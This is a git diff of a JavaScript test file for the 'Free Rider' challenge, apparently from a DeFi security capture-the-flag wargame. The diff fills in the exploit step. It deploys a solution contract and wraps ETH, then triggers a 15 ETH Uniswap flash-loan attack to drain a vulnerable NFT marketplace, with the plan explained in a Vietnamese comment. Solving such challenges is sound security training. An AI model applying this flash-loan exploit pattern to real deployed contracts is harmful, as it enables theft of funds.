@@ -45,7 +45,7 @@ describe('[Challenge] Free Rider', function () {
             this.uniswapFactory.address,
             this.weth.address
         );
-        
+
         // Approve tokens, and then create Uniswap v2 pair against WETH and add liquidity
         // Note that the function takes care of deploying the pair automatically
         await this.token.approve(
@@ -61,7 +61,7 @@ describe('[Challenge] Free Rider', function () {
             (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
             { value: UNISWAP_INITIAL_WETH_RESERVE }
         );
-        
+
         // Get a reference to the created Uniswap pair
         const UniswapPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer);
         this.uniswapPair = await UniswapPairFactory.attach(
@@ -98,13 +98,42 @@ describe('[Challenge] Free Rider', function () {
         // Deploy buyer's contract, adding the attacker as the partner
         this.buyerContract = await (await ethers.getContractFactory('FreeRiderBuyer', buyer)).deploy(
             attacker.address, // partner
-            this.nft.address, 
+            this.nft.address,
             { value: BUYER_PAYOUT }
         );
     });
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // flashloan 15ETH từ uniswap, sau đó lợi dụng mua hết 6 NFT-> trả nợ rồi gửi 6NFT cho buyer để nhận 45ETH
+
+        const FreeRiderSolution = await ethers.getContractFactory("FreeRiderSolution", attacker);
+        this.solution = await FreeRiderSolution.deploy(
+            this.buyerContract.address,
+            this.marketplace.address,
+            this.nft.address,
+            this.weth.address,
+            this.uniswapPair.address
+        );
+
+        // deposit 0.1 ETH để lấy 0.1WETH
+        await this.weth.connect(attacker).deposit({ value: ethers.utils.parseEther('0.1') });
+        // approve cho solution tiêu được weth
+        this.weth.connect(attacker).approve(this.solution.address, ethers.constants.MaxUint256);
+        
+        // console.log("Attacker before attack: ");
+        // console.log((await ethers.provider.getBalance(attacker.address)).toString()/1e18);
+        // console.log((await this.weth.balanceOf(attacker.address)).toString()/1e18);
+
+        await this.solution.connect(attacker).attack(ethers.utils.parseEther('15'));
+
+        // console.log("Attacker after attack: ");
+        // console.log((await ethers.provider.getBalance(attacker.address)).toString()/1e18);
+        // console.log((await this.weth.balanceOf(attacker.address)).toString()/1e18);
+
+        // console.log("Solution: ");
+        // console.log((await ethers.provider.getBalance(this.solution.address)).toString()/1e18);
+        // console.log((await this.weth.balanceOf(this.solution.address)).toString()/1e18);
     });
 
     after(async function () {
